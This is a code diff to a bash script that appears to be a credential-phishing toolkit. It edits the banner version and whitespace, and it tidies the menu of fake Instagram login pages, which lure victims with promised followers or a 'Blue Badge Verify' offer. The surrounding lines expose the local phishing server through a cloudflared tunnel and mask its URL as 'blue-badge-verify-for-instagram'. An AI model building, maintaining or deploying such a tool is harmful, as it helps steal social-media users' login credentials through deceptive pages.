@@ -61,7 +61,7 @@ banner() {
 		
 ${GREEN}            OI
 ${ORANGE}       BY SHIVAM ADHAU                               
-${ORANGE}   ${RED}Version : 1.2
+${ORANGE}   ${RED}Version : 1.28
               
 
 ${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by SHIVAM_ADHAU ${WHITE}
@@ -262,7 +262,7 @@ start_cloudflared() {
     else
         sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
     fi
-
+    
 	{ sleep 8; clear; banner_small; }
 	
 	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
@@ -330,11 +330,11 @@ site_instagram() {
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page (plan may get cancled)
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page (under maintenance ,will try to finish till early jan)
+		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
 		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
 
-	EOFunder
+	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
@@ -356,7 +356,7 @@ site_instagram() {
 			mask='https://blue-badge-verify-for-instagram'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...(kya hacker banega re tu)"
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_instagram; };;
 	esac
 }
